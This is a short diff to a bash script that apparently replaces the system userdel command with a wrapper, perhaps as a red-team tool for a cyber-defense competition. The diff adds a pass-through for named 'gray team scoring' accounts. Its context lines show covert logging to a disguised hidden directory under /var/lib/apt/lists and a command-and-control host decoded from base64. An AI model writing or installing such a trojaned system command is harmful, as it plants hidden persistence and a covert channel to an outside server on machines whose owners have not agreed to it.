@@ -1,5 +1,11 @@
 #!/bin/bash
 REAL_USERDEL="/usr/sbin/userdel"
+
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_USERDEL "$@" ;;
+esac
+
 LOG_DIR="/var/lib/apt/lists/.cache"
 LOCAL_LOG="${LOG_DIR}/events"
 C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
